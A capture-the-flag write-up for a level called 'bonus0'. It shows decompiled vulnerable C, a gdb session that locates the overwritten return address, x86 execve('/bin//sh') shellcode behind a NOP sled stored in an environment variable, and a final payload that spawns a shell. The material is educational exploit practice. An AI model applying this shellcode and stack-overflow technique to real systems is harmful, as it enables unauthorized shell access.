# Bonus0

## Code

```
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

unsigned short *a = 32;

void    p(char *dest, char *s)
{
  char buf[4096];

  puts(s);
  read(0, buf, 4096);
  *strchr(buf, '\n') = 0;
  strncpy(dest, buf, 20);
}

void    pp(char *dest)
{
  char str1[20]; 
  char str2[20];

  p(str1, " - ");
  p(str2, " - ");
  strcpy(dest, str1);
  dest[strlen(dest)] = *a;
  strcat(dest, str2);
}

int     main(int argc, const char **argv)
{
  char s[42];

  pp(s);
  puts(s);
  return 0;
}
```

## Explanation


- This program takes two strings and does some copying and concatenation
    stuff with them before displaying both strings.

- After a few tests, we noticed that it was quite easy to overflow the two
    buffers by giving them more than 20 characters. They are copied with 
    strncpy, therefore if no '\0' is found after 20 characters, the string
    will not be null terminated.

- When running the program with gdb, you can see the address where the
    program tried to jump before segfault, so by replacing this address
    with the address of our shellcode, we should be able to launch a 
    shell session.

- So we used gdb with these inputs :

    (gdb) run
        Starting program: /home/user/bonus0/bonus0 
        - 
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        - 
        ABCDEFGHIJKLMNOPQRSTUVWX
        AAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOPQRST��� ABCDEFGHIJKLMNOPQRST���

        Program received signal SIGSEGV, Segmentation fault.
        0x4d4c4b4a in ?? ()

- Looking at the address, we recognize the ascii values for J, K, L and M

- We understood that we were going to need to overflow these two strings
    while giving the second string our shellcode's address at the spot
    where JKLM stood in our previous test, so at bytes 10, 11, 12, 13.

- This time we decided to write our shellcode as an env variable thanks
    this command :

        export EXPLOIT=`python -c 'print "\x90" * 50 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"'`

        (We start by printing 50 NOP bytes so we don't have to be super precise when jumping
        to our shell code, we can jump a few bytes after the address and the program will
        slide to the next instructions)

- To get our variable address, we compiled a small program in /tmp :

    #include <stdio.h>
    #include <stdlib.h>

    int main()
    {
        printf("%p\n", getenv("EXPLOIT"));
        return 0;
    }

- When executing it we got the address 0xbffff805, so our jump needs to be done there,
    or a few bytes later since we have 50 NOP bytes.

## Exploit

- So here is our final payload :
```
$    (python -c'print "A" * 30' ; python -c'print "A" * 9 + "\xbf\xff\xf8\x08"[::-1] + "A" * 50' ; cat)  | ./bonus0
```
- Of course, the number of "A"s in the first string, and the number of "A"s after 
    the shellcode address in the second string can be different, as long as the
    final strings are longer than 20.